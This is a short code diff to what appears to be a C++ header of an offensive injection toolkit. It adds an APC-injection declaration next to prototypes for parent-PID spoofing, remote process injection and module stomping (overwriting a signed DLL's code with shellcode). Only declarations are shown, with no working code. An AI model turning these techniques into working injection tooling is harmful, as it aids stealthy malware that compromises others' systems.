@@ -12,6 +12,9 @@ BOOL SpawnWithPPID(const wchar_t* targetPath, DWORD parentPid,
 BOOL InjectRemoteProcess(DWORD pid, const BYTE* payload, SIZE_T payloadSize,
                          HANDLE* hThreadOut = nullptr);
 
+// APC injection
+BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize);
+
 // Module stomping — overwrite .text of a signed DLL already in the remote process
 BOOL StompModule(DWORD pid, const wchar_t* dllPath,
                  const BYTE* shellcode, SIZE_T shellcodeSize);
